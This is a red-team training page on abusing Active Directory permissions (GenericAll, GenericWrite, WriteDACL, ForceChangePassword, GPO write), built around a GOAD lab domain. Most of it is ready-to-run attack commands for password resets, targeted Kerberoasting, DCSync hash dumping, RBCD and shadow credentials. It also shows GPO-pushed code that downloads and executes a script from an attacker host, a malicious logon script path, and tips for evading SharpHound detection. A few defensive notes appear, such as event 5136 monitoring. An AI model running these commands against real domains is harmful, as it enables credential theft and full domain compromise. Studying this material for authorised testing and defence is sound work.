---
layout: training-page
title: "ACL / ACE Abuse — Red Team Academy"
module: "Active Directory"
tags:
  - acl
  - ace
  - genericwrite
  - lateral-movement
page_key: "ad-acl-abuse"
render_with_liquid: false
---

# ACL / ACE Abuse

## AD ACLs as Attack Paths

Active Directory Access Control Lists (ACLs) define who can do what to every object in the directory. Every user, group, and computer has an ACL — a list of Access Control Entries (ACEs). When misconfigured, these create invisible privilege escalation paths: a user with `GenericWrite` over a Domain Admin can reset their password; a group with `WriteDACL` on the domain root can grant themselves DCSync rights.

BloodHound visualizes these as edges in the attack graph. Common misconfigurations appear in GOAD's LANNISTER group (ForceChangePassword, GenericWrite) and are extremely common in real enterprise environments.

![ACL abuse chain: GenericWrite on user leads to WriteDACL on DC, granting DCSync rights to pull all domain hashes](/images/active-directory/acl-abuse-chain.svg)  
*// acl abuse chain — chaining ACE permissions to DCSync*

## Finding Interesting ACEs

```
# PowerView — find all non-default ACEs (WARNING: slow on large domains):
Find-InterestingDomainAcl -ResolveGUIDs

# Filter to specific rights:
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|AddMember"
} | Select IdentityReferenceName, ObjectDN, ActiveDirectoryRights

# Get ACLs for a specific object:
Get-DomainObjectAcl -Identity 'cersei.lannister' -ResolveGUIDs

# Get ACLs on the domain root (for DCSync rights):
Get-DomainObjectAcl -DistinguishedName "DC=north,DC=sevenkingdoms,DC=local" \
  -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "DS-Replication"}

# Resolve SID to name:
ConvertFrom-SID S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1105
```

## GenericAll — Full Control

`GenericAll` gives complete control over an object. On a user: reset their password, modify any attribute, add SPNs. On a group: add or remove members. On a computer: shadow credentials, constrained delegation abuse.

```
# GenericAll on a user — reset their password:
# PowerView:
Set-DomainUserPassword -Identity 'cersei.lannister' \
  -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)

# From Linux (rpcclient — requires domain credentials):
rpcclient -U 'north.sevenkingdoms.local/attacker_user%password' 192.168.56.10
rpcclient $> setuserinfo2 cersei.lannister 23 'NewP@ssw0rd!'

# GenericAll on a group — add yourself to Domain Admins:
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker_user'

# Verify membership:
Get-DomainGroupMember -Identity 'Domain Admins'
```

## GenericWrite — Attribute Modification

`GenericWrite` allows writing specific attributes. Most commonly abused to set a Service Principal Name (SPN) on a target user — making them kerberoastable — or to set a logon script that runs on the target's next login.

```
# GenericWrite → Targeted Kerberoasting:
# Step 1: Set SPN on target user:
Set-DomainObject -Identity 'robb.stark' \
  -Set @{ServicePrincipalName='fake/kerb'} \
  -Credential $cred

# Step 2: Kerberoast the account:
GetUserSPNs.py 'north.sevenkingdoms.local/attacker:pass' \
  -dc-ip 192.168.56.10 \
  -request \
  -outputfile targeted.txt

# Step 3: Crack hash, then remove SPN:
Set-DomainObject -Identity 'robb.stark' -Clear ServicePrincipalName

# GenericWrite → Logon Script (code exec on next user login):
Set-DomainObject -Identity 'robb.stark' \
  -Set @{scriptpath='\\attacker_ip\share\malicious.bat'}
# When robb.stark next logs in, the script runs in their context

# GenericWrite on Group → AddMember:
# If GenericWrite is on a group object, you can add members:
Add-DomainGroupMember -Identity 'IT Admins' -Members 'attacker_user'
```

## ForceChangePassword

`ForceChangePassword` (also called `User-Force-Change-Password`) allows resetting a user's password *without knowing the current password*. This is the most direct ACE — you own the account the moment you find it.

```
# ForceChangePassword — Windows (PowerView):
$newpass = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'target_user' -AccountPassword $newpass -Credential $cred

# ForceChangePassword — Linux (rpcclient):
rpcclient -U 'domain/attacker_user%password' DC_IP
rpcclient $> setuserinfo2 target_user 23 'NewP@ssw0rd!'
# 23 = change password (UAS_PasswordChange operation)

# ForceChangePassword — Linux (pth-net, if available):
pth-net rpc password "target_user" "NewP@ssw0rd!" -U "domain/attacker_user%password" -S DC_IP

# Verify new password works:
crackmapexec smb DC_IP -u 'target_user' -p 'NewP@ssw0rd!' -d 'domain.local'
```

## AddMember — Group Membership Abuse

Having `AddMember` (or `Self-Membership`) on a group allows adding any user to that group. If the group grants admin rights on computers, or leads to Domain Admins, this is privilege escalation.

```
# Add user to group with AddMember right (PowerView):
Add-DomainGroupMember -Identity 'IT-Admins' -Members 'attacker_user'

# Verify:
Get-DomainGroupMember -Identity 'IT-Admins' | Select MemberName

# From Linux (net rpc):
net rpc group addmem 'IT-Admins' 'attacker_user' \
  -U 'domain/attacker_user%password' \
  -S DC_IP

# After adding to admin group — access resources:
crackmapexec smb 192.168.56.22 -u 'attacker_user' -p 'password' -d 'domain.local'
```

## WriteDACL & WriteOwner — Escalating to Full Control

`WriteDACL` lets you modify an object's ACL — you can grant yourself `GenericAll`. `WriteOwner` lets you take ownership, then grant yourself `WriteDACL`, then `GenericAll`. Both lead to complete control of the object.

```
# WriteDACL on a user → grant yourself GenericAll:
$guid = [Guid]"00000000-0000-0000-0000-000000000000"
$identity = [Security.Principal.NTAccount]"NORTH\attacker_user"
$sid = $identity.Translate([Security.Principal.SecurityIdentifier])

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  $sid,
  [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
  [System.Security.AccessControl.AccessControlType]::Allow,
  $guid,
  [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
  $guid
)
$object = Get-ADObject "CN=TargetUser,DC=north,DC=sevenkingdoms,DC=local"
$acl = Get-ACL "AD:CN=TargetUser,DC=north,DC=sevenkingdoms,DC=local"
$acl.AddAccessRule($ace)
Set-ACL "AD:CN=TargetUser,DC=north,DC=sevenkingdoms,DC=local" $acl

# Simpler — PowerView shortcut:
Add-DomainObjectAcl -TargetIdentity 'target_user' \
  -PrincipalIdentity 'attacker_user' \
  -Rights All

# WriteDACL on domain root → grant DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=north,DC=sevenkingdoms,DC=local" \
  -PrincipalIdentity 'attacker_user' \
  -Rights DCSync

# WriteOwner — take ownership first:
Set-DomainObjectOwner -Identity 'target_user' -OwnerIdentity 'attacker_user'
# Then grant yourself WriteDACL/GenericAll
```

## Shadow Credentials (GenericWrite on Computer)

`GenericWrite` on a computer object enables Shadow Credentials — adding an alternate credential (certificate-based) to the computer's `msDS-KeyCredentialLink` attribute. This allows authenticating as that computer account without knowing its password.

```
# Add shadow credential to computer (requires ADCS/Kerberos PKINIT):
# pywhisker (Python tool):
pip3 install pywhisker
python3 pywhisker.py -d 'north.sevenkingdoms.local' \
  -u 'attacker_user' -p 'password' \
  --target 'castelblack$' \
  --action add

# This generates a certificate and adds it to msDS-KeyCredentialLink
# Then authenticate as the computer using the certificate:
# gettgtpkinit.py -cert-pfx attacker.pfx -pfx-pass password \
#   north.sevenkingdoms.local/castelblack$ castelblack.ccache

# From the machine TGT, perform S4U2Self to get a TGS as any user
```

## ACE Abuse — GOAD Attack Path (LANNISTER Group)

```
># GOAD: LANNISTER group members have ACEs over other accounts
# Step 1: Identify which accounts are in LANNISTER group
Get-DomainGroupMember 'LANNISTER'

# Step 2: Check what ACEs LANNISTER members hold
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
  $_.IdentityReferenceName -like "*lannister*"
}

# Step 3: Use ForceChangePassword to own a privileged account
Set-DomainUserPassword -Identity 'target' -AccountPassword (ConvertTo-SecureString 'Hack3d!' -AsPlainText -Force)

# Step 4: Escalate with newly owned account
# (likely leads to DA via group membership or further ACEs)
```

## ACE Quick Reference

| ACE Right | On User | On Group | On Computer |
| --- | --- | --- | --- |
| GenericAll | Reset password, set SPN, modify all attrs | Add/remove members | Shadow creds, RBCD |
| GenericWrite | Set SPN, logon script, some attrs | Add members | Shadow creds, RBCD |
| ForceChangePassword | Reset without knowing current | N/A | N/A |
| AddMember | N/A | Add users to group | N/A |
| WriteDACL | Grant yourself GenericAll | Grant yourself GenericAll | Grant yourself GenericAll |
| WriteOwner | Take ownership → WriteDACL | Take ownership → WriteDACL | Take ownership → WriteDACL |

## Key Resources

- [HackTricks ACL abuse guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Whisker (Shadow Credentials, C#)](https://github.com/eladshamir/Whisker)
- [pywhisker (Shadow Credentials, Python)](https://github.com/ShutdownRepo/pywhisker)
- [ired.team ACE abuse reference](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

## ACL Types Overview

Access control in AD uses several models. The most relevant for attackers are DACLs (who can access what) and SACLs (auditing access attempts). Each ACL contains ACEs — access control entries — which define allowed or denied rights for a specific security principal.

| Model | Basis | Notes |
| --- | --- | --- |
| DAC (Discretionary) | Owner controls access | Flexible; most common in AD misconfigs |
| MAC (Mandatory) | System-enforced classification | Less flexible; not typical in AD |
| RBAC (Role-Based) | Role/group membership | Managed via AD group membership |
| ABAC (Attribute-Based) | User/resource attributes + policy | Highly flexible; rare in AD environments |

## Targeted ACL Enumeration with PowerView

Rather than running Find-InterestingDomainAcl against all objects (very slow), target enumeration against a specific user's SID to find what rights that user holds.

```
# Get SID for a specific user:
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley

# Find all objects where wley has rights (with GUID resolution):
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Common rights to look for:
# User-Force-Change-Password → ForceChangePassword
# GenericWrite → set SPN, logon script
# GenericAll → full control
# DS-Replication-Get-Changes → DCSync right

# Enumerate what a second user can do (chain ACE paths):
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}

# Using built-in Get-Acl (no PowerView — slower but stealthier):
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access |
    Where-Object {$_.IdentityReference -match 'DOMAIN\\targetuser'}
}
```

## GPO Abuse — Code Execution via Group Policy

Group Policy Objects (GPOs) linked to OUs apply configuration to all computers/users in that OU. If a low-privileged account has write access to a GPO (or the network share hosting GPO files), they can push arbitrary code execution to all machines in the linked OU.

```
# Find OUs where a GPO you control is linked:
Get-DomainGPOComputerLocalGroupMapping -Identity youruser | Select-Object GPODisplayName, ComputerName, ObjectDistinguishedName

# Find computers in an OU where you have GPO write:
Get-DomainOU -GPLink "GPO-GUID" | Get-DomainComputer -SearchBase $_.DistinguishedName

# Modify GPO to add immediate scheduled task (executes on group policy refresh):
# SharpGPOAbuse:
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT AUTHORITY\SYSTEM \
  --Command "cmd.exe" --Arguments "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" \
  --GPOName "Vulnerable GPO"

# Force group policy refresh on target (if you have rights):
Invoke-GPUpdate -Computer dc01.corp.local -Force

# Or wait for default refresh interval (~90 min for computers, 5 min for DCs)

# Enumerate GPO links to find which computers will receive the policy:
Get-DomainGPO -Identity "Vulnerable GPO" | Select-Object -ExpandProperty LinkedTo

```

## GPO Permissions Enumeration

Finding GPOs where non-admin users have write rights is the first step to GPO abuse.

```
# Find GPOs where non-admin users have write rights (PowerView):
Get-DomainGPO | ForEach-Object {
    $gpo = $_
    Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "Write|GenericAll"} |
    Select-Object @{n="GPO";e={$gpo.displayname}}, IdentityReferenceName, ActiveDirectoryRights
}

# Detection: GPO modification generates Event ID 5136
# Prevention: Restrict GPO modifications to specific privileged accounts
# Monitor for event 5136 and alert if unexpected account performs GPO edits

# Honeypot approach: Create a deliberately misconfigured GPO (linked to non-critical servers)
# Monitor event 5136 — any modification triggers account disabling:
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |
  Where-Object {$_.Properties[8].Value -match "CN={HONEYPOT-GPO-GUID},CN=POLICIES"}
if($Logs) {
    $Logs | ForEach-Object { Disable-ADAccount -Identity $_.Properties[3].Value }
}
```

## DCSync — Abusing Replication Rights

DCSync rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) allow any principal to replicate credential hashes from the domain as if it were a Domain Controller. Once you have these rights — either via WriteDACL on the domain root or direct assignment — run DCSync to pull every account's NTLM hash, including krbtgt.

```
# Check who has DCSync rights on the domain (PowerView):
Get-DomainObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "DS-Replication"}

# If you have WriteDACL on domain root — grant yourself DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity 'attacker_user' \
  -Rights DCSync

# Perform DCSync with mimikatz (dump specific user):
lsadump::dcsync /domain:domain.local /user:Administrator

# Dump krbtgt (enables Golden Ticket):
lsadump::dcsync /domain:domain.local /user:krbtgt

# Dump all accounts:
lsadump::dcsync /domain:domain.local /all /csv

# From Linux — secretsdump (no mimikatz required):
secretsdump.py domain.local/attacker_user:password@DC_IP
```

## GenericAll on Computer — LAPS and RBCD

Full control over a computer object unlocks multiple attacks: reading the LAPS-managed local admin password (if LAPS is deployed), configuring Resource-Based Constrained Delegation, or adding Shadow Credentials to the computer's `msDS-KeyCredentialLink`.

```
# GenericAll on computer → read LAPS password (if LAPS deployed):
Get-DomainComputer -Identity targetcomputer -Properties ms-Mcs-AdmPwd

# GenericAll on computer → configure RBCD (impersonate any user to that computer):
# Step 1: Get your controlled computer's SID
$AttackerSID = Get-DomainComputer attacker_machine | Select-Object -ExpandProperty objectsid

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($AttackerSID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer targetcomputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 3: Use Rubeus to perform S4U2Self + S4U2Proxy
Rubeus.exe s4u /user:attacker_machine$ /rc4:HASH /impersonateuser:Administrator \
  /msdsspn:cifs/targetcomputer.domain.local /ptt
```

## ACL Attack Chains

ACL misconfigurations rarely sit in isolation — they chain together across objects to create full domain compromise paths. The approach: enumerate ACEs for your current user, follow the chain, and map the complete escalation route before acting.

```
# ACL chain analysis workflow:
# 1. Get SID for your compromised user:
$sid = Convert-NameToSid "compromised_user"

# 2. Find all objects where compromised_user has rights:
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}

# 3. For each object found, check what rights the object itself holds:
$sid2 = Convert-NameToSid "next_account_in_chain"
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid2}

# Example chain:
# User1 (you) → ForceChangePassword → User2
# User2 → GenericWrite → Computer1
# Computer1 → unconstrained delegation → can steal TGTs of authenticating users
# → compromise high-privilege account via coercion

# Clean up after red team assessment:
# Remove SPN: Set-DomainObject -Identity target -Clear ServicePrincipalName
# Remove group member: Remove-DomainGroupMember -Identity "Group" -Members "attacker_user"
# Restore password: coordinate with client — no way to restore to previous hash
```

## ForceChangePassword via bloodyAD (Linux)

`bloodyAD` is a Python tool for exploiting AD permissions from Linux without needing a Windows host. It directly exercises DACL rights over LDAP. Particularly useful for `ForceChangePassword` and `GenericWrite` exploitation over a socks proxy.

```
# Install bloodyAD:
sudo apt-get install libkrb5-dev
pip3 install bloodyAD

# ForceChangePassword via bloodyAD (requires proxychains + chisel tunnel to DC):
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u svc_account -p 'password' \
  set password target_user 'NewPassword123!'

# Verify the password change succeeded:
proxychains netexec smb TARGET_IP -u target_user -p 'NewPassword123!'

# Alternative: impacket smbpasswd.py:
# impacket-smbpasswd -h   (shows options)
smbpasswd -r DC_IP -U DOMAIN/attacker_user%password    # native Linux tool

# bloodyAD GenericWrite — set SPN for targeted Kerberoasting:
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u compromised_user -p 'password' \
  set object target_user servicePrincipalName -v fake/target.domain.local

# Verify SPN was set:
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u compromised_user -p 'password' \
  get object target_user

# bloodyAD GET commands for enumeration:
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u user -p 'password' get object TARGET_USER
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u user -p 'password' get membership TARGET_USER
```

## GenericWrite → Targeted Kerberoasting via c2tc-kerberoast

After setting a fake SPN via `GenericWrite`, request the TGS ticket using Sliver's `c2tc-kerberoast` BOF. Convert the raw ticket to Hashcat format using `TicketToHashcat.py` for offline cracking.

```
# Step 1: Set fake SPN on target user (via bloodyAD or PowerView GenericWrite):
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u david -p 'Password123!' \
  set object websec servicePrincipalName -v fake/web01.domain.local

# Step 2: Request TGS ticket via Sliver c2tc-kerberoast BOF:
sliver (beacon) > c2tc-kerberoast roast TARGET_USERNAME

# Step 3: Save the encoded ticket output to a local file, then convert:
python3 TicketToHashcat.py target-ticket.enc
# Output: roastme-13100.txt (RC4/etype23), or roastme-19600/19700 for AES

# Step 4: Crack with hashcat or john:
hashcat -m 13100 roastme-13100.txt /usr/share/wordlists/rockyou.txt
john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt

# Step 5: Cleanup — remove the fake SPN:
proxychains bloodyAD --host DC_IP -d DOMAIN.LOCAL -u david -p 'Password123!' \
  set object websec servicePrincipalName -v ""
# Or PowerView:
Set-DomainObject -Identity target_user -Clear ServicePrincipalName
```

## BloodHound / SharpHound4 Data Collection — OpSec

SharpHound generates ZIP and JSON files that match known Sigma detection rules. Use a non-default zip filename to avoid triggering file-name based detections. The ingestor also generates disk artifacts on the target.

```
># Sigma rule that detects default SharpHound output filenames:
# TargetFilename|endswith:
#   - 'BloodHound.zip'
#   - '_computers.json'
#   - '_containers.json'
#   - '_domains.json'
#   - '_gpos.json'
#   - '_groups.json'
#   - '_ous.json'
#   - '_users.json'

# Use --zipfilename to avoid default 'BloodHound.zip' detection:
.\SharpHound.exe -c All --zipfilename customname

# Sliver sharp-hound-4 with custom zip name:
sliver (beacon) > sharp-hound-4 -- -c All --zipfilename academy

# After collection, download and analyze:
# Download: sliver > download 20231110100403_academy.zip
# Upload to BloodHound for analysis

# If BloodHound version incompatibility:
# Use bloodhound-convert to reformat data:
# pip install bloodhound-convert
# bloodhound-convert --input academy.zip --output converted/

# OPSEC note: even with custom zipname, ingestor:
# - Generates multiple network queries (LDAP, SMB session enum, etc.)
# - Leaves disk artifacts on the collection host
# - Triggers MDI/Defender Identity alerts for enumeration patterns
# Consider targeted collection: -c ACL,ObjectProps,Default (skip Session enum)
```
